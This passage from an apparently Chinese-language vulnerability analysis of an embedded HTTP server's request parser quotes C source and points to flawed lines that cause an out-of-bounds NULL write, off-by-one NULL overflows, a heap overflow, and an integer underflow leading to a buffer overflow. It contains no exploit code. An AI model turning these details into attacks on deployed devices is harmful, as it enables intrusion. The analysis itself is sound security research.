                                        <span class="comment">/* -------------- PARSE REQ PROTOCOL VER -------------- */</span></span><br><span class="line">            <span class="keyword">case</span> HTTPs_CONN_STATE_REQ_PARSE_PROTOCOL_VERSION:</span><br><span class="line">                 HTTPsReq_ProtocolVerParse(p_instance, p_conn, &amp;err);</span><br><span class="line">                    <span class="keyword">switch</span> (err) {</span><br><span class="line">                        <span class="keyword">case</span> HTTPs_ERR_NONE:                            <span class="comment">/* If the Protocol Ver parsing is successful... */</span></span><br><span class="line">                                                                        <span class="comment">/* ...go to the next step.                      */</span></span><br><span class="line">                             p_conn-&gt;State        = HTTPs_CONN_STATE_REQ_PARSE_HDR;</span><br><span class="line">                             p_conn-&gt;SockState    = HTTPs_SOCK_STATE_NONE;</span><br><span class="line">                             DEF_BIT_CLR(p_conn-&gt;Flags, HTTPs_FLAG_RESP_LOCATION);</span><br><span class="line">                             <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">case</span> HTTPs_ERR_REQ_MORE_DATA_REQUIRED:          <span class="comment">/* If more data is required to complete the...  */</span></span><br><span class="line">                             p_conn-&gt;SockState = HTTPs_SOCK_STATE_RX;   <span class="comment">/* ...Protocol Ver parsing, exit the state...   */</span></span><br><span class="line">                             done              = DEF_YES;               <span class="comment">/* ...machine.                                  */</span></span><br><span class="line">                             <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">default</span>:                                      <span class="comment">/* If the Protocol Ver parsing has failed...      */</span></span><br><span class="line">                             HTTPs_ERR_INC(p_ctr_err-&gt;Req_ErrInvalidCtr); <span class="comment">/* ...generate an error...                    */</span></span><br><span class="line">                             p_conn-&gt;SockState = HTTPs_SOCK_STATE_NONE;</span><br><span class="line">                             p_conn-&gt;ErrCode   = err;</span><br><span class="line">                             p_conn-&gt;State     = HTTPs_CONN_STATE_ERR_INTERNAL;</span><br><span class="line">                             done                = DEF_YES;             <span class="comment">/* ...and exit the state machine.               */</span></span><br><span class="line">                             <span class="keyword">break</span>;</span><br><span class="line">                    }</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                                                                <span class="comment">/* ------------------ PARSE REQ HDR ------------------- */</span></span><br><span class="line">            <span class="keyword">case</span> HTTPs_CONN_STATE_REQ_PARSE_HDR:</span><br><span class="line">                 HTTPsReq_HdrParse(p_instance, p_conn, &amp;err);   <span class="comment">/* See Note #2.                                         */</span></span><br><span class="line">                 <span class="keyword">switch</span> (err) {</span><br><span class="line">                     <span class="keyword">case</span> HTTPs_ERR_NONE:                       <span class="comment">/* If the Protocol Ver parsing is successful...         */</span></span><br><span class="line">                                                                <span class="comment">/* ...go to the next step.                              */</span></span><br><span class="line">                          p_conn-&gt;State     = HTTPs_CONN_STATE_REQ_LINE_HDR_HOOK;</span><br><span class="line">                          p_conn-&gt;SockState = HTTPs_SOCK_STATE_NONE;</span><br><span class="line">                          HTTPs_STATS_INC(p_ctr_stats-&gt;Req_StatProcessedCtr);</span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                     <span class="keyword">case</span> HTTPs_ERR_REQ_MORE_DATA_REQUIRED:     <span class="comment">/* If more data is required to complete the...          */</span></span><br><span class="line">                          p_conn-&gt;SockState = HTTPs_SOCK_STATE_RX; <span class="comment">/* ...Protocol Ver parsing, exit the state...        */</span></span><br><span class="line">                          done              = DEF_YES;          <span class="comment">/* ...machine.                                          */</span></span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                     <span class="keyword">default</span>:                                    <span class="comment">/* If the Header parsing has failed...                  */</span></span><br><span class="line">                         HTTPs_ERR_INC(p_ctr_err-&gt;Req_ErrInvalidCtr); <span class="comment">/* ...generate an error...                         */</span></span><br><span class="line">                         p_conn-&gt;ErrCode = err;</span><br><span class="line">                         p_conn-&gt;State   = HTTPs_CONN_STATE_ERR_INTERNAL;</span><br><span class="line">                         done            = DEF_YES;              <span class="comment">/* ...and exit the state machine.                       */</span></span><br><span class="line">                         <span class="keyword">break</span>;</span><br><span class="line">                 }</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                                                                <span class="comment">/* --------------- CONN REQ EXT PROCESS --------------- */</span></span><br><span class="line">            <span class="keyword">case</span> HTTPs_CONN_STATE_REQ_LINE_HDR_HOOK:</span><br><span class="line">                 hook_def = HTTPs_HOOK_DEFINED(p_cfg-&gt;HooksPtr, OnReqHook);</span><br><span class="line">                 <span class="keyword">if</span> (hook_def == DEF_YES) {</span><br><span class="line">                     accepted = p_cfg-&gt;HooksPtr-&gt;OnReqHook(p_instance,</span><br><span class="line">                                                           p_conn,</span><br><span class="line">                                                           p_cfg-&gt;Hooks_CfgPtr);</span><br><span class="line">                     <span class="keyword">if</span> (accepted != DEF_YES) {</span><br><span class="line">                                                                <span class="comment">/* If the connection is not authorized ...              */</span></span><br><span class="line">                         <span class="keyword">if</span> (p_conn-&gt;StatusCode == HTTP_STATUS_OK) {</span><br><span class="line">                             p_conn-&gt;StatusCode = HTTP_STATUS_UNAUTHORIZED;</span><br><span class="line">                         }</span><br><span class="line">                         DEF_BIT_SET(p_conn-&gt;Flags, HTTPs_FLAG_REQ_FLUSH);</span><br><span class="line">                         p_conn-&gt;State = HTTPs_CONN_STATE_REQ_BODY_FLUSH_DATA;</span><br><span class="line">                     }</span><br><span class="line">                 }</span><br><span class="line">                                                                <span class="comment">/* Otherwise, receive the body.                         */</span></span><br><span class="line">                 p_conn-&gt;State     = HTTPs_CONN_STATE_REQ_BODY_INIT;</span><br><span class="line">                 done              = DEF_YES;                   <span class="comment">/* ... exit the state machine.                          */</span></span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                HTTPs_ERR_INC(p_ctr_err-&gt;Req_ErrStateUnkownCtr);</span><br><span class="line">                p_conn-&gt;ErrCode = HTTPs_ERR_STATE_UNKNOWN;</span><br><span class="line">                p_conn-&gt;State   = HTTPs_CONN_STATE_ERR_INTERNAL;</span><br><span class="line">                done            = DEF_YES;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>此次漏洞分析的主要漏洞都在字段解析中</p><h3 id="oob-write-vulnerability"><a href="#oob-write-vulnerability" class="headerlink" title="oob write vulnerability"></a>oob write vulnerability</h3><p>Method解析中存在长度重置错误引起后续的out-of-bounds write vulnerability</p><ul><li>首先在[1]中，p_request_method_start会获取整个数据包的第一个有效字符</li><li>计算长度，将第一个有效字符之前的无效字符长度给去掉[2]</li><li>接着利用<code>Str_Char_N</code>函数截取空格，此时将位置返回给<code>p_request_method_end</code>[3]</li><li>然后取得<code>p_request_method_end - p_request_method_start</code>的长度，也就是method的长度[4]</li><li><code>p_conn-&gt;RxBufLenRem</code>会减去上面的method长度[5]</li></ul><p>漏洞点出在了[4]这里，这里的len直接被赋值成了method的长度，没有考虑到前面无效字符，导致<code>p_conn-&gt;RxBufLenRem -= len</code>这里多出了无效字符的长度，也就是有多少个无效字符，长度就多出多少</p><p>而[6]这里就是正确的计算</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span>  <span class="type">void</span>  <span class="title function_">HTTPsReq_MethodParse</span> <span class="params">(HTTPs_INSTANCE  *p_instance,</span></span><br><span class="line"><span class="params">                                HTTPs_CONN      *p_conn,</span></span><br><span class="line"><span class="params">                                HTTPs_ERR       *p_err)</span></span><br><span class="line">{</span><br><span class="line">...</span><br><span class="line">    len = p_conn-&gt;RxBufLenRem;</span><br><span class="line">...</span><br><span class="line">                                                                <span class="comment">/* Move the start ptr to the first meanningful char.    */</span></span><br><span class="line">    p_request_method_start = HTTP_StrGraphSrchFirst(p_conn-&gt;RxBufPtr, len);             <span class="comment">/* [1] p_request_method_start advances to the </span></span><br><span class="line"><span class="comment">                                                                                            first character between 0x21 - 0x7e*/</span></span><br><span class="line">    <span class="keyword">if</span> (p_request_method_start == DEF_NULL) {</span><br><span class="line">    *p_err = HTTPs_ERR_REQ_FORMAT_INVALID;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    len -= p_request_method_start - p_conn-&gt;RxBufPtr ;                                  <span class="comment">/* [2] len is correctly calculated */</span></span><br><span class="line">                                                                <span class="comment">/* Find the end of method string.                       */</span></span><br><span class="line">    p_request_method_end =  Str_Char_N(p_request_method_start, len, ASCII_CHAR_SPACE);  <span class="comment">/* [3] */</span></span><br><span class="line">    <span class="keyword">if</span> (p_request_method_end == DEF_NULL) {</span><br><span class="line">    *p_err = HTTPs_ERR_REQ_FORMAT_INVALID;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    len = p_request_method_end - p_request_method_start;                                <span class="comment">/* [4] This is the bug */</span></span><br><span class="line">...</span><br><span class="line">    p_conn-&gt;RxBufLenRem -= len;                                                         <span class="comment">/* [5] */</span></span><br><span class="line">    p_conn-&gt;RxBufPtr     = p_request_method_end;                                        <span class="comment">/* [6] */</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在处理BodyForm的时候会将上面这个计算错误的长度赋值到len_str</p><p>然后<code>HTTPsReq_BodyFormAppKeyValBlkAdd</code>函数调用这个长度</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span>  CPU_BOOLEAN  <span class="title function_">HTTPsReq_BodyFormAppParse</span> <span class="params">(HTTPs_INSTANCE  *p_instance,</span></span><br><span class="line"><span class="params">                                                HTTPs_CONN      *p_conn,</span></span><br><span class="line"><span class="params">                                                HTTPs_ERR       *p_err)</span></span><br><span class="line">{</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">while</span> (done != DEF_YES) {</span><br><span class="line">                                                                <span class="comment">/* ----------- VALIDATE CUR KEY/VAL PAIRS ------------- */</span></span><br><span class="line">        p_key_next = Str_Char_N(p_key_name,                     <span class="comment">/* Srch beginning of next key/val pairs.                */</span></span><br><span class="line">                                p_conn-&gt;RxBufLenRem,</span><br><span class="line">                                ASCII_CHAR_AMPERSAND);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (p_key_next == DEF_NULL) {                           <span class="comment">/* If next key/val pairs not found ...                  */</span></span><br><span class="line">                                                                <span class="comment">/* ... determine if all data are received or next ...   */</span></span><br><span class="line">                                                                <span class="comment">/* ... key/val pairs are missing.                       */</span></span><br><span class="line">            len_content_rxd = p_conn-&gt;ReqContentLenRxd</span><br><span class="line">                            + p_conn-&gt;RxBufLenRem;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (len_content_rxd &lt; p_conn-&gt;ReqContentLen) {      <span class="comment">/* If data are missing ...                              */</span></span><br><span class="line">            *p_err = HTTPs_ERR_REQ_MORE_DATA_REQUIRED;       <span class="comment">/* ... receive more data.                               */</span></span><br><span class="line">                <span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line"></span><br><span class="line">            } <span class="keyword">else</span> {                                            <span class="comment">/* If all data received ...                             */</span></span><br><span class="line">                len_str = p_conn-&gt;RxBufLenRem;                  <span class="comment">/* [1] </span></span><br><span class="line"><span class="comment">                                                                /* ... last key/val pairs to parse.                     */</span></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">        } <span class="keyword">else</span> {                                                <span class="comment">/* Next key/val pairs found ...                         */</span></span><br><span class="line">            len_str = (p_key_next - p_key_name);                <span class="comment">/* ... parse key/val pairs.                             */</span></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">                                                                <span class="comment">/* Add key-Value block to list.                         */</span></span><br><span class="line">        result = HTTPsReq_BodyFormAppKeyValBlkAdd(p_instance,</span><br><span class="line">                                                p_conn,</span><br><span class="line">                                                p_key_name,</span><br><span class="line">                                                len_str,</span><br><span class="line">                                                p_err);         <span class="comment">/* [2] */</span></span><br><span class="line">...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在<code>HTTPsReq_BodyFormAppKeyValBlkAdd</code>中调用了<code>HTTPsReq_URL_EncodeStrParse</code>函数，str_len是一个用户控制的长度，在[1]这里导致oob write null</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span>  CPU_BOOLEAN  <span class="title function_">HTTPsReq_URL_EncodeStrParse</span> <span class="params">(HTTPs_INSTANCE  *p_instance,</span></span><br><span class="line"><span class="params">                                                HTTPs_CONN      *p_conn,</span></span><br><span class="line"><span class="params">                                                HTTPs_KEY_VAL   *p_key_val,</span></span><br><span class="line"><span class="params">                                                CPU_BOOLEAN      from_query,</span></span><br><span class="line"><span class="params">                                                CPU_CHAR        *p_str,</span></span><br><span class="line"><span class="params">                                                CPU_SIZE_T       str_len)</span></span><br><span class="line">{</span><br><span class="line">...</span><br><span class="line">                                                                <span class="comment">/* Find separator "=".                                  */</span></span><br><span class="line">    p_str_sep = Str_Char_N(p_str, str_len, ASCII_CHAR_EQUALS_SIGN);</span><br><span class="line"></span><br><span class="line">    p_str[str_len] = ASCII_CHAR_NULL;                           <span class="comment">/* [1] */</span></span><br><span class="line">...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="off-by-null-vulnerability"><a href="#off-by-null-vulnerability" class="headerlink" title="off by null vulnerability"></a>off by null vulnerability</h3><p>header解析异常后引起的单字节NULL溢出</p><ul><li>如果上面的header解析没有符合要求的，则会进入default</li><li>在[1]中得到解析失败的header长度len</li><li>在[2]中header长度len会与<code>p_cfg-&gt;HdrRxCfgPtr-&gt;DataLenMax</code>最大长度进行比较，如果超出则return</li><li>接着在最后补上一个NULL[4]</li></ul><p>漏洞点出在了[2]这里，这里的len缺少了验证len等于<code>p_cfg-&gt;HdrRxCfgPtr-&gt;DataLenMax</code>长度的情况</p><p>如果len等于<code>p_cfg-&gt;HdrRxCfgPtr-&gt;DataLenMax</code>，则[3]这里会指向现有标准长度的最后一位，而[4]这里又会继续添加一个NULL，所以造成了一个单字节NULL溢出</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">File: http-s_req.c</span><br><span class="line"><span class="number">1759</span>:                     <span class="keyword">default</span>:</span><br><span class="line"><span class="number">1760</span>: <span class="meta">#<span class="keyword">if</span> (HTTPs_CFG_HDR_RX_EN == DEF_ENABLED)</span></span><br><span class="line"><span class="number">1761</span>:                          <span class="keyword">if</span> ((p_cfg-&gt;HdrRxCfgPtr != DEF_NULL) &amp;&amp;</span><br><span class="line"><span class="number">1762</span>:                              (p_cfg-&gt;HooksPtr    != DEF_NULL)) {</span><br><span class="line"><span class="number">1763</span>:                              keep = p_cfg-&gt;HooksPtr-&gt;OnReqHdrRxHook(p_instance,                       <span class="comment">/* [0] */</span></span><br><span class="line"><span class="number">1764</span>:                                                                     p_conn,</span><br><span class="line"><span class="number">1765</span>:                                                                     p_cfg-&gt;Hooks_CfgPtr,</span><br><span class="line"><span class="number">1766</span>:                                                                     field);</span><br><span class="line">...</span><br><span class="line"><span class="number">1776</span>:                              <span class="keyword">if</span> (keep == DEF_YES) {</span><br><span class="line">...</span><br><span class="line"><span class="number">1789</span>:                                 p_val = HTTPsReq_HdrParseValGet(p_field,</span><br><span class="line"><span class="number">1790</span>:                                                                 p_field_dict_entry-&gt;StrLen,</span><br><span class="line"><span class="number">1791</span>:                                                                 p_field_end,</span><br><span class="line"><span class="number">1792</span>:                                                                &amp;len);                                 <span class="comment">/* [1] */</span></span><br><span class="line">...</span><br><span class="line"><span class="number">1796</span>:                                     <span class="keyword">if</span> (len &gt; p_cfg-&gt;HdrRxCfgPtr-&gt;DataLenMax) {                       <span class="comment">/* [2] */</span></span><br><span class="line"><span class="number">1797</span>:                                         HTTPs_ERR_INC(p_ctr_errs-&gt;Req_ErrHdrDataLenInv);</span><br><span class="line"><span class="number">1798</span>:                                        *p_err = HTTPS_ERR_REQ_HDR_INVALID_VAL_LEN;</span><br><span class="line"><span class="number">1799</span>:                                         <span class="keyword">return</span>;</span><br><span class="line"><span class="number">1800</span>:                                     }</span><br><span class="line">...</span><br><span class="line"><span class="number">1807</span>:                                     p_str                 = (CPU_CHAR *)p_req_hdr_blk-&gt;ValPtr + len;  <span class="comment">/* [3] */</span></span><br><span class="line"><span class="number">1808</span>:                                    *p_str                 =  ASCII_CHAR_NULL;                         <span class="comment">/* [4] */</span></span><br><span class="line"><span class="number">1809</span>:                                     p_req_hdr_blk-&gt;ValLen =  len + <span class="number">1</span>;</span><br></pre></td></tr></tbody></table></figure><h3 id="off-by-null-vulnerability-1"><a href="#off-by-null-vulnerability-1" class="headerlink" title="off by null vulnerability"></a>off by null vulnerability</h3><p>host解析后引起的单字节NULL溢出</p><ul><li>[1]中确定HOST长度</li><li>[2]这里检查长度，最长为<code>p_cfg-&gt;HostNameLenMax</code></li><li>利用<code>Str_Copy_N</code>将HOST拷贝到<code>p_conn-&gt;HostPtr</code>中</li><li>最后补上一个NULL截断</li></ul><p>如果[2]这里的长度刚好等于<code>p_cfg-&gt;HostNameLenMax</code>，此时[3]这里就会溢出一个单字节NULL</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">File: http-s_req.c</span><br><span class="line"><span class="number">1713</span>:                                                                 <span class="comment">/* Find beginning of host string val.                   */</span></span><br><span class="line"><span class="number">1714</span>:                          p_val = HTTPsReq_HdrParseValGet(p_field,</span><br><span class="line"><span class="number">1715</span>:                                                          HTTP_STR_HDR_FIELD_HOST_LEN,</span><br><span class="line"><span class="number">1716</span>:                                                          p_field_end,</span><br><span class="line"><span class="number">1717</span>:                                                         &amp;len);                        <span class="comment">/* [1] */</span></span><br><span class="line"><span class="number">1718</span>: </span><br><span class="line"><span class="number">1719</span>:                          len   = DEF_MIN(len, p_cfg-&gt;HostNameLenMax);                 <span class="comment">/* [2] */</span></span><br><span class="line"><span class="number">1720</span>: </span><br><span class="line"><span class="number">1721</span>:                                                                 <span class="comment">/* Copy host name val in Conn struct.                   */</span></span><br><span class="line"><span class="number">1722</span>:                          (<span class="type">void</span>)Str_Copy_N(p_conn-&gt;HostPtr, p_val, len);</span><br><span class="line"><span class="number">1723</span>:                                                                 <span class="comment">/* Make sure to create a string.                        */</span></span><br><span class="line"><span class="number">1724</span>:                          p_conn-&gt;HostPtr[len] = ASCII_CHAR_NULL;                      <span class="comment">/* [3] */</span></span><br></pre></td></tr></tbody></table></figure><h3 id="Heap-Overflow-Vulnerability"><a href="#Heap-Overflow-Vulnerability" class="headerlink" title="Heap Overflow Vulnerability"></a>Heap Overflow Vulnerability</h3><p>boundary解析后引起的堆溢出</p><p>在解析之后，可以看到len并没有进行任何的限制，直接利用[0]进行了<code>Str_Copy_N</code>到了<code>p_conn-&gt;FormBoundaryPtr</code>中，导致了堆溢出</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">File: http-s_req.c</span><br><span class="line"><span class="number">1661</span>:                                               p_val++;          <span class="comment">/* Remove space before boundary val.                    */</span></span><br><span class="line"><span class="number">1662</span>:                                               p_val = HTTP_StrGraphSrchFirst(p_val,</span><br><span class="line"><span class="number">1663</span>:                                                                              len);</span><br><span class="line"><span class="number">1664</span>:                                               len   = p_field_end - p_val;</span><br><span class="line"><span class="number">1665</span>: </span><br><span class="line"><span class="number">1666</span>:                                                                 <span class="comment">/* Copy boundary val to Conn struct.                    */</span></span><br><span class="line"><span class="number">1667</span>:                                               Str_Copy_N(p_conn-&gt;FormBoundaryPtr,                         <span class="comment">/* [0] */</span></span><br><span class="line"><span class="number">1668</span>:                                                          p_val,</span><br><span class="line"><span class="number">1669</span>:                                                          len);</span><br></pre></td></tr></tbody></table></figure><h3 id="Buffer-Overflow-Vulnerability"><a href="#Buffer-Overflow-Vulnerability" class="headerlink" title="Buffer Overflow Vulnerability"></a>Buffer Overflow Vulnerability</h3><p>在解析Protocol时引起的整数下溢，最后导致Buffer Overflow Vulnerability</p><ul><li>[1]这里会得到第一个有效字符</li><li>[2]这里找到\r\n判断最后一个字符，这样就得到了一个Protocol字段</li><li>然后[3]这里会更新长度、位置</li></ul><p>最终的漏洞点发生在[3]这里，整数下溢。如果前面存在无效字符，[1]这里跳过无效字符之后，len并没有更新长度，还是原始的<code>RxBufLenRem</code></p><p>而后面搜索<code>\r\n</code>时使用这个len值就会越界访问，在缓冲区之外搜索，由于<code>p_protocol_ver_end</code>可能位于原始缓冲区之外，在更新<code>RxBufLenRem</code>时这个<code>p_protocol_ver_end - p_conn-&gt;RxBufPtr + 2</code>可能是一个负数，[3]这里减去这个负数后，<code>RxBufLenRem</code>发生整数下溢</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HTTPsReq_ProtocolVerParse */</span></span><br><span class="line"><span class="type">static</span>  <span class="type">void</span>  <span class="title function_">HTTPsReq_ProtocolVerParse</span> <span class="params">(HTTPs_INSTANCE  *p_instance,</span></span><br><span class="line"><span class="params">                                     HTTPs_CONN      *p_conn,</span></span><br><span class="line"><span class="params">                                     HTTPs_ERR       *p_err)</span></span><br><span class="line">{</span><br><span class="line">...</span><br><span class="line">    len = p_conn-&gt;RxBufLenRem;</span><br><span class="line">...</span><br><span class="line">                                                                <span class="comment">/* Move the pointer to the next meaningful char.        */</span></span><br><span class="line">    p_protocol_ver_start = HTTP_StrGraphSrchFirst(p_conn-&gt;RxBufPtr, len);       <span class="comment">/* [1] p_protocol_ver_start advances to the first character </span></span><br><span class="line"><span class="comment">                                                                                    between 0x21 - 0x7e */</span></span><br><span class="line">    <span class="keyword">if</span> (p_protocol_ver_start == DEF_NULL) {</span><br><span class="line">    *p_err               = HTTPs_ERR_REQ_FORMAT_INVALID;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">                                                                <span class="comment">/* Find the end of the request line.                    */</span></span><br><span class="line">    p_protocol_ver_end = Str_Str_N(p_protocol_ver_start, STR_CR_LF, len);       <span class="comment">/* [2] this will search outside of the buffer since len </span></span><br><span class="line"><span class="comment">                                                                                    does not account for the previously skipped characters in [1] */</span></span><br><span class="line">    <span class="keyword">if</span> (p_protocol_ver_end == DEF_NULL) {                       <span class="comment">/* If not found, check to get more data.                */</span></span><br><span class="line">        <span class="keyword">if</span> (p_conn-&gt;RxBufPtr != p_conn-&gt;BufPtr) {</span><br><span class="line">        *p_err = HTTPs_ERR_REQ_MORE_DATA_REQUIRED;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">        *p_err = HTTPs_ERR_REQ_FORMAT_INVALID;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">...</span><br><span class="line">                                                                <span class="comment">/* Update the RxBuf ptr.                                */</span></span><br><span class="line">    p_conn-&gt;RxBufLenRem      -= (p_protocol_ver_end - p_conn-&gt;RxBufPtr) + <span class="number">2</span>;    <span class="comment">/* [3] Since p_protocol_ver_end can be outside of the </span></span><br><span class="line"><span class="comment">                                                                                    original buffer, this could lead to an integer underflow */</span></span><br><span class="line">    p_conn-&gt;RxBufPtr          =  p_protocol_ver_end + <span class="number">2</span>;</span><br><span class="line">...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>发生整数下溢后，下溢的长度值<code>p_conn-&gt;RxBufLenRem</code>会变得很大，于Mem_Copy发生溢出，接下来，下溢的长度值再次用于计算将在后续调用接收[2] 时使用的指针，这会导致攻击者控制的数据被写入接收缓冲区的边界之外</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">CPU_BOOLEAN  <span class="title function_">HTTPsSock_ConnDataRx</span> <span class="params">(HTTPs_INSTANCE  *p_instance,</span></span><br><span class="line"><span class="params">                               HTTPs_CONN      *p_conn)</span></span><br><span class="line">{</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> ((p_conn-&gt;RxBufLenRem &gt; <span class="number">0</span>) &amp;&amp;</span><br><span class="line">        (p_conn-&gt;RxBufPtr   != p_conn-&gt;BufPtr)) {               <span class="comment">/* If data is still present in the rx buf.              */</span></span><br><span class="line">                                                                <span class="comment">/* Move rem data to the beginning of the rx buf.        */</span></span><br><span class="line">            Mem_Copy(p_conn-&gt;BufPtr, p_conn-&gt;RxBufPtr, p_conn-&gt;RxBufLenRem);        <span class="comment">//[1] the length used here is very large because of the underflow</span></span><br><span class="line">    }</span><br><span class="line">    p_buf   = p_conn-&gt;BufPtr + p_conn-&gt;RxBufLenRem;                             <span class="comment">//[2] p_buf now points very far outside of the original buffer</span></span><br><span class="line">    buf_len = p_conn-&gt;BufLen - p_conn-&gt;RxBufLenRem;</span><br><span class="line">...</span><br><span class="line">    rx_len = (CPU_INT16U)NetSock_RxDataFrom(        p_conn-&gt;SockID,</span><br><span class="line">                                            (<span class="type">void</span> *)p_buf,</span><br><span class="line">                                                    buf_len,</span><br><span class="line">                                                    NET_SOCK_FLAG_NO_BLOCK,</span><br><span class="line">                                                &amp;p_conn-&gt;ClientAddr,</span><br><span class="line">                                                &amp;addr_len_client,</span><br><span class="line">                                                    DEF_NULL,</span><br><span class="line">                                                    DEF_NULL,</span><br><span class="line">                                                    DEF_NULL,</span><br><span class="line">                                                &amp;err);</span><br><span class="line">...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>至此漏洞分析完成，还有漏洞验证写poc，但是由于时间原因这里只写了漏洞分析</p><h2 id="Reference"><a href="#Reference" 